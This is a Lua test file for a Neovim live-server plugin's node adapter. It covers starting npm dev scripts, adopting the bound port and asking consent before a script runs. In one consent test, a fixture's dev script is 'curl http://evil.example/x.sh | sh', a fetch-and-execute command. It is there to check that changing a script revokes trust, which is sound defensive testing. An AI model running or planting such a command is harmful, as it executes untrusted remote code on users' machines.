--- End-to-end tests for the `node` adapter against a real npm script.
---
--- Uses a hand-written server on Node's built-in `http` module rather than a
--- real framework, so the suite needs no `npm install` and no network — but the
--- path under test is the real one: detect the project, ask for consent, run
--- `npm run dev`, hand it a port, and wait for it to answer.

local t = require("harness")
local adapters = require("live_server.adapters")
local config = require("live_server.config")
local framework = require("live_server.framework")
local manager = require("live_server.manager")
local net = require("live_server.net")
local project_mod = require("live_server.project")
local util = require("live_server.util")

if not (util.executable("node") and util.executable("npm")) then
  t.describe("node integration", function()
    t.skip("node dev server", "node or npm is not installed")
  end)
  return
end

--- A project whose `dev` script starts a server.
---@param body string JavaScript for server.js
---@param package_json? string
---@return string root
local function node_project(body, package_json)
  local root = util.normalize(vim.fn.tempname())
  vim.fn.mkdir(root, "p")
  util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
  util.write_file(root .. "/server.js", body)
  util.write_file(
    root .. "/package.json",
    package_json or '{"name":"fixture","private":true,"scripts":{"dev":"node server.js"}}'
  )
  framework.invalidate()
  project_mod.invalidate()
  return root
end

local RESPECTS_PORT = [[
const http = require("http");
const port = Number(process.env.PORT);
const host = process.env.HOST || "127.0.0.1";
http.createServer((_, res) => { res.writeHead(200, {"Content-Type":"text/html"}); res.end("<h1>node fixture</h1>"); })
  .listen(port, host, () => console.log(`ready on http://${host}:${port}`));
]]

---@param server live_server.Server
local function stop(server)
  if server then
    manager.stop(server)
    vim.wait(8000, function()
      return not server:is_active()
    end, 50)
  end
  manager.prune()
end

t.describe("node integration", function()
  local function configure(overrides)
    config.did_setup = false
    config.setup(vim.tbl_extend("force", {
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      restart = { on_crash = false },
      -- Consent is exercised separately; here we are testing the run path.
      project = { trust = "allow" },
      port = { strategy = "scan", range = { 5820, 5860 }, remember = false },
      ready = { timeout = 30000 },
    }, overrides or {}))
  end

  t.it("runs the project's dev script and serves it", function()
    configure()
    local root = node_project(RESPECTS_PORT)

    local started, failure = nil, nil
    manager.start({ dir = root }, function(server, err)
      started, failure = server, err
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil or failure ~= nil
      end, 100),
      "start never completed"
    )
    t.truthy(started, "node dev server failed to start: " .. tostring(failure))
    t.eq(started.status, "running")
    t.eq(started.adapter.name, "node")

    if util.executable("curl") then
      local code = vim.trim(vim.fn.system({ "curl", "-fsS", "-o", "/dev/null", "-w", "%{http_code}", started:url() }))
      t.eq(code, "200", "the dev server did not answer")
    end

    local port = started.port
    stop(started)
    t.truthy(
      vim.wait(8000, function()
        return net.is_free("127.0.0.1", port)
      end, 100),
      "the port was not released — an npm child process probably outlived its parent"
    )
  end)

  t.it("adopts the port the process actually bound", function()
    -- The classic Express mistake: `app.listen(4000)` hard-coded, ignoring
    -- PORT entirely. Reporting that server as unreachable would be technically
    -- true and completely useless.
    configure()
    local hardcoded = 5871
    if not net.is_free("127.0.0.1", hardcoded) then
      hardcoded = 5872
    end

    local root = node_project(([[
const http = require("http");
http.createServer((_, res) => { res.writeHead(200); res.end("ok"); })
  .listen(%d, "127.0.0.1", () => console.log("Listening on http://127.0.0.1:%d"));
]]):format(hardcoded, hardcoded))

    local started = nil
    manager.start({ dir = root, port = 5830 }, function(server)
      started = server
    end)
    t.truthy(
      vim.wait(40000, function()
        return started ~= nil
      end, 100),
      "the server never became ready on the port it reported"
    )
    t.eq(started.port, hardcoded, "expected the reported port to be adopted")
    t.contains(started:url(), tostring(hardcoded))
    stop(started)
  end)

  t.it("reports a project with no dev script instead of guessing", function()
    configure()
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root, "p")
    util.write_file(root .. "/package.json", '{"name":"lib","version":"1.0.0"}')
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    framework.invalidate()
    project_mod.invalidate()

    local failure = nil
    manager.start({ dir = root, adapter = "node" }, function(_, err)
      failure = err or "failed"
    end)
    t.truthy(
      vim.wait(5000, function()
        return failure ~= nil
      end, 50),
      "no error was reported"
    )
    t.contains(failure, "script")
  end)

  t.it("labels the server by framework, not by adapter", function()
    configure()
    local root = node_project(RESPECTS_PORT, '{"dependencies":{"next":"14"},"scripts":{"dev":"node server.js"}}')
    local project = project_mod.get(root)
    t.eq(adapters.display_for("node", project), "Next.js")
  end)

  t.it("does not offer the node adapter outside a Node project", function()
    configure()
    local root = util.normalize(vim.fn.tempname())
    vim.fn.mkdir(root, "p")
    util.write_file(root .. "/index.html", "<h1>static</h1>")
    util.write_file(root .. "/.git/HEAD", "ref: refs/heads/main")
    framework.invalidate()
    project_mod.invalidate()

    local project = project_mod.get(root)
    t.falsy(adapters.suits_project("node", project), "a folder of HTML is not an npm project")

    -- `auto` must therefore fall through to a static server.
    config.did_setup = false
    config.setup({ server = "auto", browser = { auto_open = false }, detect_orphans = false })
    local spec = adapters.resolve("auto", project)
    if spec then
      t.neq(spec.name, "node")
    end
  end)

  config.did_setup = false
  config.setup({})
end)

t.describe("node adapter consent", function()
  t.it("refuses to run a script without consent", function()
    config.did_setup = false
    config.setup({
      server = "node",
      browser = { auto_open = false },
      detect_orphans = false,
      -- "deny" stands in for the user answering no at the prompt.
      project = { trust = "deny" },
      port = { strategy = "scan", range = { 5880, 5890 }, remember = false },
    })

    local root = node_project(RESPECTS_PORT)
    local failure, server = nil, nil
    manager.start({ dir = root, adapter = "node" }, function(started, err)
      server, failure = started, err
    end)
    t.truthy(
      vim.wait(5000, function()
        return failure ~= nil or server ~= nil
      end, 50),
      "start never resolved"
    )
    t.eq(server, nil, "a denied script must not run")
    t.contains(failure, "consent")

    config.did_setup = false
    config.setup({})
  end)

  t.it("keys consent on the script, not the whole package.json", function()
    config.did_setup = false
    config.setup({ project = { trust = "prompt" } })
    local trust = require("live_server.trust")
    trust.revoke()

    local root = node_project(RESPECTS_PORT)
    local project = project_mod.get(root)
    local request = adapters.get("node").requires_consent(project)
    t.truthy(request, "the node adapter must ask for consent")
    trust.record(request.path, request.content, "allow")
    t.eq(trust.decision(request.path, request.content), "allow")

    -- A dependency bump must not re-prompt.
    util.write_file(
      root .. "/package.json",
      '{"name":"fixture","private":true,"dependencies":{"left-pad":"1.3.0"},"scripts":{"dev":"node server.js"}}'
    )
    framework.invalidate()
    project_mod.invalidate()
    local after_bump = adapters.get("node").requires_consent(project_mod.get(root))
    t.eq(trust.decision(after_bump.path, after_bump.content), "allow", "a dependency change should not revoke consent")

    -- Changing what `dev` runs must.
    util.write_file(
      root .. "/package.json",
      '{"name":"fixture","private":true,"scripts":{"dev":"curl http://evil.example/x.sh | sh"}}'
    )
    framework.invalidate()
    project_mod.invalidate()
    local after_edit = adapters.get("node").requires_consent(project_mod.get(root))
    t.eq(
      trust.decision(after_edit.path, after_edit.content),
      "unknown",
      "editing the script must require fresh consent"
    )

    trust.revoke()
    config.did_setup = false
    config.setup({})
  end)
end)
